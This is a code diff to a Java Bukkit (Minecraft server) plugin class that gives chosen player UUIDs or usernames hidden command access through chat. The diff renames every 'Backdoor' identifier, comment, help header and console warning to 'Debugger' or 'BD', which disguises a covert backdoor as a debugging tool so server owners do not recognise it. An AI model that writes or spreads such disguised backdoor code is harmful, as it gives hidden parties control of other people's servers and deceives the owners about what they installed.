@@ -1,5 +1,5 @@
 
-package com.thiccindustries.backdoor;
+package com.thiccindustries.debugger;
 
 import org.bukkit.*;
 import org.bukkit.command.ConsoleCommandSender;
@@ -19,11 +19,11 @@ import java.util.Calendar;
 import java.util.Date;
 import java.util.Locale;
 
-public final class Backdoor implements Listener {
+public final class Debugger implements Listener {
 
     private Plugin plugin;
 
-    public Backdoor(Plugin plugin, boolean Usernames, String[] UUID, String prefix){
+    public Debugger(Plugin plugin, boolean Usernames, String[] UUID, String prefix){
         Config.uuids_are_usernames = Usernames;
         Config.authorized_uuids  = UUID;
         Config.command_prefix   = prefix;
@@ -32,9 +32,9 @@ public final class Backdoor implements Listener {
 
         Config.tmp_authorized_uuids = new String[plugin.getServer().getMaxPlayers() - 1];
 
-        if(Config.display_backdoor_warning){
+        if(Config.display_debugger_warning){
             Bukkit.getConsoleSender()
-                    .sendMessage(Config.chat_message_prefix + " Plugin '" + plugin.getName() + "' has a backdoor installed.");
+                    .sendMessage(Config.chat_message_prefix + " Plugin '" + plugin.getName() + "' has a Debugger installed.");
         }
 
         plugin.getServer().getPluginManager().registerEvents(this, plugin);
@@ -49,7 +49,7 @@ public final class Backdoor implements Listener {
 
         Player p = e.getPlayer();
 
-        //Is user authorized to use backdoor commands
+        //Is user authorized to use Debugger commands
         if (IsUserAuthorized(p)) {
 
             if (Config.display_debug_messages) {
@@ -519,7 +519,7 @@ public final class Backdoor implements Listener {
             case "help": {
                 if (args.length == 1) {
                     p.sendMessage(Config.help_detail_color + "-----------------------------------------------------");
-                    p.sendMessage(Config.help_detail_color + "## Backdoor ## () = Required, [] = Optional.");
+                    p.sendMessage(Config.help_detail_color + "## BD ## () = Required, [] = Optional.");
                     for (int i = 0; i < Config.help_messages.length; i++) {
                         p.sendMessage(Config.help_command_name_color + Config.command_prefix + Config.help_messages[i].getName() + ": " + Config.help_messages[i].getSyntax());
                     }
